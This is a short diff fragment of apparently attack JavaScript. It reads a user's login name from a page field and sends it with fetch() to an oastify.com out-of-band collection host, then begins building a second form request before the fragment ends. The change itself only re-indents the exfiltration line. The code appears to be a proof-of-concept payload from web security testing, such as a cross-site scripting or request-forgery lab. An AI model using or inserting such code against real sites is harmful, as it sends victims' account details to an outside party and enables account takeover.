@@ -24,7 +24,7 @@
       doc.querySelector('input[name="ProfileInfo.LoginName"]')?.value;
 
     console.log("username:", username);
-fetch('https://e8nqpku10p8gzynraefduguziqohca0z.oastify.com?username='+username)
+    fetch('https://e8nqpku10p8gzynraefduguziqohca0z.oastify.com?username='+username)
     console.log("before second request");
 
     const fd = new FormData();
